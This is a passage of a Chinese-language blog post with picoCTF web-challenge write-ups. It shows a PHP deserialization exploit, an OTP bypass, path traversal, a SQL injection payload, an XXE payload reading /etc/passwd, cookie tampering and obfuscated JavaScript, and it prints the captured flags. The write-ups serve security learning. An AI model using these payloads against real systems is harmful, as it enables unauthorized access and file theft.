<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$perm</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$perm</span><span class="token operator">-></span><span class="token function">is_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Welcome admin"</span><span class="token punctuation">;</span>
	<span class="token variable">$log</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">access_log</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"access.log"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$log</span><span class="token operator">-></span><span class="token function">append_to_log</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Logged in at "</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Y-m-d"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
	<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Welcome guest"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>cookie.php 如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">permissions</span>
<span class="token punctuation">&#123;</span>
	<span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>

	<span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$u</span><span class="token punctuation">;</span>
		<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> <span class="token variable">$u</span><span class="token operator">.</span><span class="token variable">$p</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">function</span> <span class="token function-definition function">is_guest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token variable">$guest</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>

		<span class="token variable">$con</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SQLite3</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"../users.db"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span>
		<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span>
		<span class="token variable">$stm</span> <span class="token operator">=</span> <span class="token variable">$con</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT admin, username FROM users WHERE username=? AND password=?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$stm</span><span class="token operator">-></span><span class="token function">bindValue</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token constant">SQLITE3_TEXT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$stm</span><span class="token operator">-></span><span class="token function">bindValue</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token constant">SQLITE3_TEXT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$stm</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$rest</span> <span class="token operator">=</span> <span class="token variable">$res</span><span class="token operator">-></span><span class="token function">fetchArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$rest</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$rest</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token variable">$guest</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">return</span> <span class="token variable">$guest</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

        <span class="token keyword">function</span> <span class="token function-definition function">is_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>

                <span class="token variable">$con</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SQLite3</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"../users.db"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span>
                <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span>
                <span class="token variable">$stm</span> <span class="token operator">=</span> <span class="token variable">$con</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT admin, username FROM users WHERE username=? AND password=?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$stm</span><span class="token operator">-></span><span class="token function">bindValue</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token constant">SQLITE3_TEXT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$stm</span><span class="token operator">-></span><span class="token function">bindValue</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token constant">SQLITE3_TEXT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$stm</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$rest</span> <span class="token operator">=</span> <span class="token variable">$res</span><span class="token operator">-></span><span class="token function">fetchArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$rest</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$rest</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                                <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
                        <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token keyword">return</span> <span class="token variable">$admin</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	<span class="token keyword">try</span><span class="token punctuation">&#123;</span>
		<span class="token variable">$perm</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$g</span> <span class="token operator">=</span> <span class="token variable">$perm</span><span class="token operator">-></span><span class="token function">is_guest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$perm</span><span class="token operator">-></span><span class="token function">is_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Error</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Deserialization error. "</span><span class="token operator">.</span><span class="token variable">$perm</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以發現在 <code>cookie.php</code>中有以下漏洞：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$perm</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$g</span> <span class="token operator">=</span> <span class="token variable">$perm</span><span class="token operator">-></span><span class="token function">is_guest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$perm</span><span class="token operator">-></span><span class="token function">is_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Error</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Deserialization error. "</span> <span class="token operator">.</span> <span class="token variable">$perm</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>這裡的反序列化是不安全的（題目名稱也有提示是和 Serial 有關），如果反序列化失敗，進入到 catch error 裡面，就會把 <code>$perm</code>輸出。在 <code>authentication.php</code>裡面的 <code>access_log</code>這個類中，他定義了 <code>__toString()</code>就是讀取並回傳 <code>log_file</code>的內容。</p><p>所以我們只要建立一個 <code>login</code>的 cookie，並輸入錯誤的值，就可以觸發反序列化的錯誤。下圖中我設置了 <code>login</code>的值為 <code>TEST</code>，成功觸發反序列化錯誤的訊息。</p><p><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/image-20240706160307961.png" alt="Deserialization error"></p><p>接著我們用<a target="_blank" rel="noopener" href="https://onlinephp.io/">PHP Sandbox</a>來線上寫一些 php 的程式碼。這邊會這樣寫是因為我們從 <code>cookie.phps</code>中可以看到原始碼是先 URL decode 再 Base64 decode，最後才反序列化。所以整個流程就是反過來就對了。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"TEST"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>他這邊輸出了 <code>czo0OiJURVNUIjs%3D</code>，我們把 cookie 的值修改為這個試試看，能不能正確的輸出 <code>TEST</code>。</p><p><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/image-20240706160839984.png" alt="PoC"></p><p>成功！再來我們只需要 new 一個 access_log 的 class，並且把他的 <code>$log_file</code>設定為 <code>&quot;../flag&quot;</code>就可以了！Exploit 如下。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">access_log</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$log_file</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"../flag"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">access_log</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">print</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面這個代碼執行後會得到</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>這個就是我們最終的 Payload 啦，把它貼到 <code>login</code>的 cookie 的 value，並在<code>authentication.php</code>的頁面重新整理試試看吧。</p><p><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/image-20240706161944368.png" alt="Pwned!"></p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">picoCTF&#123;th15_vu1n_1s_5up3r_53r1ous_y4ll_405f4c0e&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="Java-Code-Analysis">Java Code Analysis!?!</h1><p>這題稍微大一點，是一個電子書系統。一開始他給了一個登入介面還有一組帳密：帳號 <code>user</code>，密碼 <code>user</code>。除此之外，也有給源代碼。我們先來看看網頁的樣子。</p><p><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/image-20240704143233744.png" alt="Login"></p><p>登入後會看到更多的功能，包括閱讀書籍、查詢書籍、查看帳戶等等。登入後的介面如下。</p><p><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/image-20240704143405607.png" alt="Home page"></p><p>題目告訴我們，這題的 Winning condition 是要讀取到 Flag 的書籍，就可以獲得 Flag 了。但是向上圖所看到的，我們現在是 Free user，而 Flag 這本書只有 Admin 可以閱讀，所以要來想辦法提升權限。</p><p><strong>// TODO</strong></p><h1 id="IntroToBurp">IntroToBurp</h1><p>這題要用到 BurpSuite 來攔截封包。首先先把 Burp 的攔截給打開。</p><p><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/image-20240819164944293.png" alt="打開攔截"></p><p>接著把 Browser 打開並連接到題目給的 URL。發現是個註冊頁面，先亂填一些東西試試。填完後按下 Register 會發現 Burp 攔截了我們的封包，這邊不用對封包做修改，直接按下 Forward 送過去。接著會跳到一個 OTP 驗證頁面，一樣先隨便輸入一些東西。</p><p><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/image-20240819165409960.png" alt="2FA Auth"></p><p>接著到 Burp 裡面修改 OTP 的數據，直接把整行刪掉。</p><p><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/image-20240819165507475.png" alt="BurpSuite"></p><p>刪掉後直接 Forward 把封包送過去就行啦！如果只是留空白按 Submit，還是會發送一個 OTP 的 Data，所以要用 Burp 直接刪掉。就如同題目給的提示一樣。</p><blockquote><p>Try mangling the request, maybe their server-side code doesn’t handle malformed requests very well.</p></blockquote><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">picoCTF&#123;#0TP_Bypvss_SuCc3$S_e1eb16ed&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="Forbidden-Paths">Forbidden Paths</h1><p>題目介紹如下：</p><blockquote><p>Can you get the flag? We know that the website files live in <code>/usr/share/nginx/html/</code> and the flag is at <code>/flag.txt</code> but the website is filtering absolute file paths. Can you get past the filter to read the flag?</p><p>Additional details will be available after launching your challenge instance.</p></blockquote><p>把題目給的網站點開來看長這樣。</p><p><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/24/8/image_73025f05e72f6debf09b6484921102bd.png" alt="題目"></p><p>測試一下上面這些 txt 檔案後後發現就是一個可以讀檔案的程式，既然題目都告訴我們這個網站專案路徑了，那就只需要回推回根目錄就可以了。因為是 <code>/usr/share/nginx/html/</code>有四層，那就回去四層前的目錄並讀取 <code>flag.txt</code>就可以了。最終 Payload 如下。</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">../../../../flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Flag 就跑出來啦！如下。</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">picoCTF&#123;7h3_p47h_70_5ucc355_e5a6fcbc&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="It-is-my-Birthday">It is my Birthday</h1><p>題目敘述</p><blockquote><p>I sent out 2 invitations to all of my friends for my birthday! I’ll know if they get stolen because the two invites look similar, and they even have the same md5 hash, but they are slightly different! You wouldn’t believe how long it took me to find a collision. Anyway, see if you’re invited by submitting 2 PDFs to my website.</p></blockquote><p>看了敘述後可以發現應該是要上傳兩個具有相同 MD5 Hash 值得 PDF 文件。這邊我們可以直接使用<a target="_blank" rel="noopener" href="https://github.com/corkami/collisions/tree/master/examples/free">這個 Github Repo</a> 裡面的 <strong>md5-1.pdf</strong> 和 <strong>md5-2.pdf</strong>。把這兩個檔案下載下來後上傳到題目的網站就可以了。</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">picoCTF&#123;c0ngr4ts_u_r_1nv1t3d_aebcbf39&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="Irish-Name-Repo-1">Irish-Name-Repo 1</h1><p>題目敘述</p><blockquote><p>There is a website running at <code>a</code> (<a target="_blank" rel="noopener" href="https://jupiter.challenges.picoctf.org/problem/39720/">link</a>) or <a target="_blank" rel="noopener" href="http://jupiter.challenges.picoctf.org:39720">http://jupiter.challenges.picoctf.org:39720</a>. Do you think you can log us in? Try to see if you can login!</p></blockquote><p>所以就是要登入啦。先到 Login 的頁面看看，發現他傳到 <code>login.php</code>的參數中有一個 <code>debug=0</code>，如下。</p><p><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/24/8/image_ca9db2efbbd073e8976545347ab4bac9.png" alt="debug=0"></p><p>所以使用 BurpSuite 打開網頁並修改參數。把 <code>debug=0</code>改為 <code>debug=1</code>，然後 Forward 請求後會發現傳回來的 debug 訊息。</p><p><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/24/8/image_00819763eb396b4830a7d6e748ed4e98.png" alt="Debug Mode"></p><p>既然知道他的 SQL 語句，就可以直接 SQLi 啦。Payload 是 <code>' OR 1=1--</code>，順利得到 Flag。</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">picoCTF&#123;s0m3_SQL_c218b685&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="SOAP">SOAP</h1><p>這題根據題目給的提示，是一個 XXE 漏洞。我對於 XXE 沒什麼了解，去參考了<a target="_blank" rel="noopener" href="https://ithelp.ithome.com.in/articles/10339624">這篇文章</a>，裡面有關於 XXE 比較詳細的介紹。至於這題，先用 BurpSuite 打開去攔截過程中傳送的封包。</p><p>打開後網站後，發現點選這三個按鈕都會觸發一個請求。</p><p><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/24/8/image_6e336e2d693ea607f9ddf4ed86ba485e.png" alt="題目"></p><p>我們先隨便點一個讓 Burp 抓到他的封包，我們在進一步修改 XML Payload。封包內容長下面這樣。</p><p><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/24/8/image_4ebeddb4957c4760a8cdeab8f7c2a778.png" alt="封包內容"></p><p>因為題目有說要讀取 <code>/etc/passwd</code>這個路徑，所以我們把封包修改一下變成下面這樣。</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">data</span> <span class="token punctuation">[</span><span class="token internal-subset">

&lt;!ENTITY ext SYSTEM "file:///etc/passwd">
</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>data</span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ID</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&ext;">&amp;ext;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ID</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>data</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把請求 Forward 之後，看到網頁上回傳的內容如下。</p><p><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/24/8/image_86556b71eb01e19bc33ffcf13bca4794.png" alt="Pwned"></p><p>就成功找到 Flag 啦。</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">picoCTF&#123;XML_3xtern@l_3nt1t1ty_0dcf926e&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="SQL-Direct">SQL Direct</h1><p>這題要連接到 PostgreSQL 的資料庫，先打開 Kali。打開後輸入以下命令連接到資料庫，密碼為<code>postgres</code>。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">psql <span class="token parameter variable">-h</span> saturn.picoctf.net <span class="token parameter variable">-p</span> <span class="token number">51152</span> <span class="token parameter variable">-U</span> postgres pico<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>-h</code>代表 Host</li><li><code>-p</code>代表 Port</li><li><code>-U</code>代表 Username</li><li><code>pico</code>代表資料庫名稱</li></ul><p>連接到後可以先輸入<code>\d</code>查看 Tables。</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">pico=# \d
         List of relations
 Schema | Name  | Type  |  Owner
--------+-------+-------+----------
 public | flags | table | postgres
(1 row)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到有一個叫做<code>flags</code>的表，這邊直接用以下命令把資料查詢出來。</p><pre class="line-numbers language-postgresql" data-language="postgresql"><code class="language-postgresql">SELECT * FROM flags;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>果然看到 Flag 了。</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">picoCTF&#123;L3arN_S0m3_5qL_t0d4Y_73b0678f&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="Cookies">Cookies</h1><p>打開題目給的網頁後，按下<code>F12</code>並進到 Application 裡面查看 Cookies，看到有一個叫做 name 的 cookie，他的 value 是-1，把他的 value 改為 0 試試看，發現頁面變了，Show I love snickerdoodle cookies!。那把這個 value 一直往上加，一直試到 18 就會發現 Flag 了。</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">picoCTF&#123;3v3ry1_l0v3s_c00k135_cc9110ba&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="More-Cookies">More Cookies</h1><p>TODO</p><h1 id="Client-side-again">Client-side-again</h1><p>這題在 F12 後可以看到一個很長很亂的 javascript，他是被混淆處理（obfuscation）過的。先把它給格式化一下，看起來比較舒服。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> _0x5a46 <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">"f49bf&#125;"</span><span class="token punctuation">,</span>
    <span class="token string">"_again_e"</span><span class="token punctuation">,</span>
    <span class="token string">"this"</span><span class="token punctuation">,</span>
    <span class="token string">"Password\x20Verified"</span><span class="token punctuation">,</span>
    <span class="token string">"Incorrect\x20password"</span><span class="token punctuation">,</span>
    <span class="token string">"getElementById"</span><span class="token punctuation">,</span>
    <span class="token string">"value"</span><span class="token punctuation">,</span>
    <span class="token string">"substring"</span><span class="token punctuation">,</span>
    <span class="token string">"picoCTF&#123;"</span><span class="token punctuation">,</span>
    <span class="token string">"not_this"</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>
